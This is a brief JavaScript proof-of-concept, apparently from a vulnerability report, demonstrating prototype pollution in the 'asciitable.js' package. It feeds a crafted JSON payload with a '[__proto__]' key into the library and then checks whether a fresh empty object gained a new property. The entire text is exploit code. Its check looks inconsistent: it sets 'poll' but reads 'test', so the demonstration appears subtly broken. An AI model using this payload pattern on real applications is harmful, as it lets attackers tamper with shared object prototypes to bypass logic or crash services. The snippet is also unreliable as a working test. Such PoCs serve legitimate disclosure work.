var a = require("asciitable.js");
let payload = `{
    "[__proto__]": {
        "poll": 123
    }
}`;
var b = JSON.parse(payload);
a({}, b);
console.log({}.test);
